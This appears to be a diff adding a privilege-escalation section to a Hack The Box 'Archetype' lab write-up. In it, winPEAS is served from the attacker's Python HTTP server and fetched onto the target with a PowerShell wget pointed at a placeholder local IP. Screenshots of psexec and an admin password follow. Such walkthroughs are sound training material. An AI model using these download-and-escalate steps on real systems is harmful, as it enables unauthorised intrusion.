@@ -112,6 +112,21 @@ Finally looking back at our netcat listener we can confirm our reverse shell and
 You can find the user.txt in user's Desktop！<br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/userflag.png" alt="userflag" width="40%">
 
+<h2>Privilege Escalation</h2>
+It is possible to download winpeas from <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe">here</a>.<br>
+We will transfer it to our target system by using once more the Python HTTP server:<br>
+<b>cmd</b>：<code>python3 -m http.server 80</code><br><br>
 
+On the target machine, we will execute the <code?wget</code> command in order to download the program from our
+system.<br>
+The file will be downloaded in the directory from which the wget command was run.<br>
+We will use powershell for all our commands:<br>
+<b>cmd</b>：<code>powershell</code><br><br>
+<b>cmd</b>：<code>wget http://&lt;local_ip&gt;/winPEASx64.exe -outfile winPEASx64.exe</code><br><br>
+<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/powershell.png" alt="powershell" width="60%">
 
+<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/psexec.py.png" alt="psexec" width="50%">
 
+<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/adminpasswd.png" alt="adminpasswd" width="60%">
+
+<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/adminflag.png" alt="adminflag" width="60%">
